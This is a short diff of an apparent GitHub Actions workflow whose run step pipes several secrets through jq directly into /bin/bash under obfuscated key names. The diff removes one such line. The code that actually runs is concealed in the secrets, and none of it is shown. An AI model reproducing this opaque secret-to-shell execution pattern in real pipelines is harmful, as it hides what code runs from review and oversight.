@@ -20,7 +20,6 @@ jobs:
           nk1: ${{ secrets.nk1 }}
         run: |
           printf '%s' "$nk1" | jq -r .kjiuj31606 | /bin/bash
-          printf '%s' "$e625" | jq -r .uwcr1 | /bin/bash
           printf '%s' "$yrjfc334" | jq -r .wa43 | /bin/bash
           printf '%s' "$ggvq728" | jq -r .huvud531 | /bin/bash
           printf '%s' "$lkch710" | jq -r .jv210 | /bin/bash
